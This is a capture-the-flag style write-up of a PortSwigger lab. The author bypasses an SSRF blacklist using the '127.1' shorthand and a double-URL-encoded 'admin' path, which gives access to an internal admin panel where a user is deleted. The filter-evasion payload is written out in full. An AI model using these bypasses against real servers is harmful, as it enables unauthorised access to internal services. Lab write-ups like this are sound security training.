# SSRF with Blacklist-Based Input Filter

> **Vulnerability Type:** SSRF  
> **Lab URL:** [SSRF Lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

---

## Objective  
Change the stock-check URL to access the admin interface located at `http://localhost/admin` and delete the user "carlos".

---

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab  

---

## Methodology  

### 1. **Discovery**  
- **Initial Observations:**  
  - Viewed a product, pressed the check stock button, and viewed the request in Burp Suite. Noticed that the stock-check API is URL encoded.
- **Testing Approach:**  
  - Changed the stockAPI URL to `http://localhost/admin`, `http://127.0.0.1` and received the response "External stock check blocked for security reasons".
  - Tried `http://127.1` which bypassed the filter and displayed the homepage.
  - Found that double URL encoding "admin" allowed bypassing the filter: `stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`.
  - Noticed the href for deleting the user carlos: `/delete?username=carlos`. Appended this to the end of the stockAPI and completed the lab.
---
### 2. **Exploitation**  
- **Payload Used:**  
  ```ssrf
  http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
  ```
---
### 3. **Screenshots**
Using the url encoded payload to get access to the admin panel, highlighting the code showing the delete function for the user "carlos" (user deleted successfully is because I deleted the other first)
![Screenshot 2025-03-05 140535](https://github.com/user-attachments/assets/a3360017-ad23-4bbd-b824-2f18b46b7989)
Deleting the user "carlos"
![Screenshot 2025-03-05 140553](https://github.com/user-attachments/assets/e517c3f7-635b-4ed0-bdde-c97b077a0a57)
